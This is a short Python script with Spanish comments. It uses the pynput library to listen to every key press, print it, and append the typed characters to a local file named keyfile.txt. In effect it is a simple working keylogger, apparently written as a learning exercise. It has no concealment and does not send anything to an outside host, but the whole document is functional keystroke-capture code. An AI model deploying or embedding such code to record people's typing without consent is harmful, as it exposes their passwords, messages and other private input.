

from pynput import keyboard #  --> libreria para captural eventos de usuarios (Instalar libreria en Terminal pip install pynput )

def keyPressed(key):
    print(str(key))  #Inprimimos los eventos
    with open("keyfile.txt", 'a') as logKey: 
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()